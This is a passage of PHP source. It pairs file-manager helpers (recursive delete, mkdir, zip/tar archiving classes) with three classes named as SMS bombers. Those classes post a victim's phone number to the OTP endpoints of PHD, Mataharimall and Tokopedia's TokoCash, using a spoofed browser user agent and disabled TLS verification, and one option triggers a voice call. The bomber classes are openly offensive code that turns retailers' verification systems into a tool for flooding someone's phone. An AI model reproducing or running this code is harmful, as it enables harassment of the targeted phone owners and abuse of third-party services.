		// Character special
		$info = 'c';
	} elseif (($perms & 0x1000) == 0x1000) {
		// FIFO pipe
		$info = 'p';
	} else {
		// Unknown
		$info = 'u';
	}

	// Owner
	$info .= (($perms & 0x0100) ? 'r' : '-');
	$info .= (($perms & 0x0080) ? 'w' : '-');
	$info .= (($perms & 0x0040) ?
	(($perms & 0x0800) ? 's' : 'x' ) :
	(($perms & 0x0800) ? 'S' : '-'));

	// Group
	$info .= (($perms & 0x0020) ? 'r' : '-');
	$info .= (($perms & 0x0010) ? 'w' : '-');
	$info .= (($perms & 0x0008) ?
	(($perms & 0x0400) ? 's' : 'x' ) :
	(($perms & 0x0400) ? 'S' : '-'));

	// World
	$info .= (($perms & 0x0004) ? 'r' : '-');
	$info .= (($perms & 0x0002) ? 'w' : '-');
	$info .= (($perms & 0x0001) ?
	(($perms & 0x0200) ? 't' : 'x' ) :
	(($perms & 0x0200) ? 'T' : '-'));

	return $info;
}

function fm_rdelete($path)
{
    if (is_link($path)) {
        return unlink($path);
    } elseif (is_dir($path)) {
        $objects = scandir($path);
        $ok = true;
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
                    if (!fm_rdelete($path . '/' . $file)) {
                        $ok = false;
                    }
                }
            }
        }
        return ($ok) ? rmdir($path) : false;
    } elseif (is_file($path)) {
        return unlink($path);
    }
    return false;
}
function fm_mkdir($dir, $force)
{
    if (file_exists($dir)) {
        if (is_dir($dir)) {
            return $dir;
        } elseif (!$force) {
            return false;
        }
        unlink($dir);
    }
    return mkdir($dir, 0777, true);
}

/**
 * Get info about zip archive
 * @param string $path
 * @return array|bool
 */
function fm_get_zif_info($path, $ext) {
    if ($ext == 'zip' && function_exists('zip_open')) {
        $arch = zip_open($path);
        if ($arch) {
            $filenames = array();
            while ($zip_entry = zip_read($arch)) {
                $zip_name = zip_entry_name($zip_entry);
                $zip_folder = substr($zip_name, -1) == '/';
                $filenames[] = array(
                    'name' => $zip_name,
                    'filesize' => zip_entry_filesize($zip_entry),
                    'compressed_size' => zip_entry_compressedsize($zip_entry),
                    'folder' => $zip_folder
                    //'compression_method' => zip_entry_compressionmethod($zip_entry),
                );
            }
            zip_close($arch);
            return $filenames;
        }
    } elseif($ext == 'tar' && class_exists('PharData')) {
        $archive = new PharData($path);
        $filenames = array();
        foreach(new RecursiveIteratorIterator($archive) as $file) {
            $parent_info = $file->getPathInfo();
            $zip_name = str_replace("phar://".$path, '', $file->getPathName());
            $zip_name = substr($zip_name, ($pos = strpos($zip_name, '/')) !== false ? $pos + 1 : 0);
            $zip_folder = $parent_info->getFileName();
            $zip_info = new SplFileInfo($file);
            $filenames[] = array(
                'name' => $zip_name,
                'filesize' => $zip_info->getSize(),
                'compressed_size' => $file->getCompressedSize(),
                'folder' => $zip_folder
            );
        }
        return $filenames;
    }
    return false;
}

/**
 * Class to work with zip files (using ZipArchive)
 */
class FM_Zipper
{
    private $zip;

    public function __construct()
    {
        $this->zip = new ZipArchive();
    }

    /**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */
    public function create($filename, $files)
    {
        $res = $this->zip->open($filename, ZipArchive::CREATE);
        if ($res !== true) {
            return false;
        }
        if (is_array($files)) {
            foreach ($files as $f) {
                if (!$this->addFileOrDir($f)) {
                    $this->zip->close();
                    return false;
                }
            }
            $this->zip->close();
            return true;
        } else {
            if ($this->addFileOrDir($files)) {
                $this->zip->close();
                return true;
            }
            return false;
        }
    }

    /**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */
    public function unzip($filename, $path)
    {
        $res = $this->zip->open($filename);
        if ($res !== true) {
            return false;
        }
        if ($this->zip->extractTo($path)) {
            $this->zip->close();
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($filename)
    {
        if (is_file($filename)) {
            return $this->zip->addFile($filename);
        } elseif (is_dir($filename)) {
            return $this->addDir($filename);
        }
        return false;
    }

    /**
     * Add folder recursively
     * @param string $path
     * @return bool
     */
    private function addDir($path)
    {
        if (!$this->zip->addEmptyDir($path)) {
            return false;
        }
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
                    if (is_dir($path . '/' . $file)) {
                        if (!$this->addDir($path . '/' . $file)) {
                            return false;
                        }
                    } elseif (is_file($path . '/' . $file)) {
                        if (!$this->zip->addFile($path . '/' . $file)) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

/**
 * Class to work with Tar files (using PharData)
 */
class FM_Zipper_Tar
{
    private $tar;

    public function __construct()
    {
        $this->tar = null;
    }

    /**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */
    public function create($filename, $files)
    {
        $this->tar = new PharData($filename);
        if (is_array($files)) {
            foreach ($files as $f) {
                if (!$this->addFileOrDir($f)) {
                    return false;
                }
            }
            return true;
        } else {
            if ($this->addFileOrDir($files)) {
                return true;
            }
            return false;
        }
    }

    /**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */
    public function unzip($filename, $path)
    {
        $res = $this->tar->open($filename);
        if ($res !== true) {
            return false;
        }
        if ($this->tar->extractTo($path)) {
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($filename)
    {
        if (is_file($filename)) {
            return $this->tar->addFile($filename);
        } elseif (is_dir($filename)) {
            return $this->addDir($filename);
        }
        return false;
    }

    /**
     * Add folder recursively
     * @param string $path
     * @return bool
     */
    private function addDir($path)
    {
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
                    if (is_dir($path . '/' . $file)) {
                        if (!$this->addDir($path . '/' . $file)) {
                            return false;
                        }
                    } elseif (is_file($path . '/' . $file)) {
                        try {
                            $this->tar->addFile($path . '/' . $file);
                        } catch (Exception $e) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

Class PhdSmsBom {
	public $no;
	public function sendC($url, $page, $params) {
		$ch = curl_init(); 
		curl_setopt ($ch, CURLOPT_URL, $url.$page); 
		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 

		if(!empty($params)) {
			curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
			curl_setopt ($ch, CURLOPT_POST, 1); 
		}

		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);

		$headers  = array();
		$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
		$headers[] = 'X-Requested-With: XMLHttpRequest';

		curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
		//curl_setopt ($ch, CURLOPT_HEADER, 1);
		$result = curl_exec ($ch);
		curl_close($ch);
		return $result;
	}
	private function getStr($start, $end, $string) {
		if (!empty($string)) {
			$setring = explode($start,$string);
			$setring = explode($end,$setring[1]);
			return $setring[0];
		}
	}
	public function Verif()
	{
		$url = "https://www.phd.co.id/en/users/sendOTP";
		$no = $this->no;
		$data = "phone_number={$no}";
		$send = $this->sendC($url, null, $data);
		if (preg_match('/We have sent an OTP to your phone, Please enter the 4 digit code./', $send)) {
			print('OTP berhasil Dikirim!<br>');
		} else {
			print('OTP Gagal Dikirim!<br>');
		}
	}    
}
Class MataharimallSmsBom {
	public $no;
	public $email;
	public $pass;
	public function sendC($url, $page, $params) {
		$ch = curl_init(); 
		curl_setopt ($ch, CURLOPT_URL, $url.$page); 
		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 

		if(!empty($params)) {
			curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
			curl_setopt ($ch, CURLOPT_POST, 1); 
		}

		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);

		$headers  = array();
		$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
		$headers[] = 'X-Requested-With: XMLHttpRequest';

		curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
		//curl_setopt ($ch, CURLOPT_HEADER, 1);
		$result = curl_exec ($ch);
		curl_close($ch);
		return $result;
	}
	private function getStr($start, $end, $string) {
		if (!empty($string)) {
			$setring = explode($start,$string);
			$setring = explode($end,$setring[1]);
			return $setring[0];
		}
	}
	public function Login($email,$pass)
	{
		$url = "https://www.mataharimall.com/user/ajax/login";
		$email = $this->email;
		$pass = $this->pass;
		$data = "email={$email}&passwd={$pass}";
		$send = $this->sendC($url, null, $data);
		if (preg_match('/sukses/', $send)) {
			// print('Login Sukses!<br>');
		} else {
			// print("Login Gagal!<br>");
		}
	}
	public function Verif()
	{
		$url = "https://www.mataharimall.com/user/ajax/requestotp";
		$no = $this->no;
		$data = "phone_number={$no}";
		$send = $this->sendC($url, null, $data);
		if (preg_match('/Kode OTP berhasil dikirim/', $send)) {
			print('OTP berhasil Dikirim!<br>');
		} else {
			print('OTP Gagal Dikirim!<br>');
		}
	}
}
Class TokopediaSmsBom {
	public $no;
	public $type;
	public function sendC($url, $page, $params) {
		$ch = curl_init(); 
		curl_setopt ($ch, CURLOPT_URL, $url.$page); 
		curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.8.1.6) Gecko/20070725 Firefox/2.0.0.6"); 
		curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1); 

		if(!empty($params)) {
			curl_setopt ($ch, CURLOPT_POSTFIELDS, $params);
			curl_setopt ($ch, CURLOPT_POST, 1); 
		}

		curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
		curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
		curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);

		$headers  = array();
		$headers[] = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
		$headers[] = 'X-Requested-With: XMLHttpRequest';

		curl_setopt ($ch, CURLOPT_HTTPHEADER, $headers);    
		//curl_setopt ($ch, CURLOPT_HEADER, 1);
		$result = curl_exec ($ch);
		curl_close($ch);
		return $result;
	}
	private function getStr($start, $end, $string) {
		if (!empty($string)) {
			$setring = explode($start,$string);
			$setring = explode($end,$setring[1]);
			return $setring[0];
		}
	}
	public function Verif()
	{
		$url = "https://www.tokocash.com/oauth/otp";
		$no = $this->no;
		$type = $this->type;
		if ($type == 1) {
			$data = "msisdn={$no}&accept=";
		}elseif ($type == 2) {
			$data = "msisdn={$no}&accept=call";
		}
		$send = $this->sendC($url, null, $data);
		// echo $send;
		if (preg_match('/otp_attempt_left/', $send)) {
			print('OTP berhasil Dikirim!<br>');
		} else {
			print('OTP Gagal Dikirim!<br>');
		}
	}
}
?>
